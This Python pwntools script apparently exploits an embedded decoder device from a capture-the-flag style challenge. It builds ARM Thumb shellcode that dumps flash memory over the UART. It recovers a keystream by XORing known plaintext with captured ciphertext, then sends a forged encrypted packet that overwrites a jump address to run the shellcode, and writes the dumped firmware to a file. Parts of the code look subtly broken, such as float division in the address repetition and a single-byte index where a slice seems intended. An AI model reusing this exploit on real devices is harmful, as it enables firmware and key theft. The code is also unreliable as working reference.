#!/usr/bin/env python3

from pwn import *
from decoder import DecoderIntf

context.arch = 'arm'

def conn():
    r = DecoderIntf('/dev/ttyACM0')

    return r


# returns the shellcode to run on the component
# this shellcode by default dumps the contents of flash to the uart
def construct_shellcode():
    # address we will read from
    start_dump_addr = 0x1000e000
    # amount of bytes we will print out
    dump_length = 0x00038000

    # dump addressess for the bootloader
    # start_dump_addr = 0x10000000
    # dump_length = 0x0000e000

    # status register for uart
    uart_status = 0x40042000 + 0x4
    # fifo register for uart
    uart_fifo_tx = 0x40042000 + 0x20

    reg_write = f'''
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        ldr r0, ={hex(start_dump_addr)}
        ldr r1, ={hex(uart_fifo_tx)}
        ldr r2, ={hex(uart_status)}
        mov r3, #1
        ldr r4, ={hex(dump_length)}
        loop:
        busy_loop:
        ldrb r6, [r2]
        and r6, r6, #0x40
        cmp r6, #0
        beq busy_loop

        ldrb r6, [r0]
        add r0, r0, #1
        strb r6, [r1]
        add r3, r3, #1
        cmp r3, r4
        ble loop
        end:
        nop
    '''

    shellcode = asm(reg_write, arch="thumb")
    assert len(shellcode) < 256

    print(shellcode)
    print(disasm(shellcode, arch='thumb'))

    return shellcode


def xor(a, b):
    return bytes(m ^ n for m, n in zip(a, b))

def main():
    r = conn()

    # {"channel": 1, "timestamp": 1465114997480395, "encoded": "01000000cbdbfaaa83340500a8b88e28f17858c2a53c68d265978e35a5460eb2165f4bbada4f061d62412f011e1933c32cab1d4cb603eb84db8019af8ff18ec0254da7b96ec7f0dde5d61b61ccb7d7195579829dfcf648b6180d53cc"}
    # REAL PACKET
    # packet = bytes.fromhex('01000000cbdbfaaa83340500a8b88e28f17858c2a53c68d265978e35a5460eb2165f4bbada4f061d62412f011e1933c32cab1d4cb603eb84db8019af8ff18ec0254da7b96ec7f0dde5d61b61ccb7d7195579829dfcf648b6180d53cc')
    # TEST PACKET
    packet = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x003\xd3!5u\xec\xae(H\x9d\xa9bF\xa5@OLc\x11\xf4\x92\xd4\xb9\xbb\x8f\x82\xfe\xde\x1fo\x88\x0f@i\xae\xde\xdb;b1\xa6\xe2\xef\xcdk\x1f\x961OS'\xbc\xf1\xb5\x87p\xd5l\xe6\xdf?<%z\xd32+\xd0\xd3m\x04.\xb3\xd8\x0f!$z\x9b\xd6"
    pt = b'a' * 64

    ct = packet[12:]
    nonce = packet[:12]

    keystream = xor(pt, ct)
    shellcode_addr = 0x20020000 - 0x58

    shellcode = construct_shellcode()

    jump_addr = p32(shellcode_addr) * (0x40 / 4)

    payload = xor(jump_addr, keystream[len(jump_addr)]) + shellcode

    payload = nonce + payload
    out = r.subscribe_and_read_raw(payload, 0x38000 - 16)

    with open('dump', 'wb') as f:
        f.write(out)

if __name__ == "__main__":
    main()
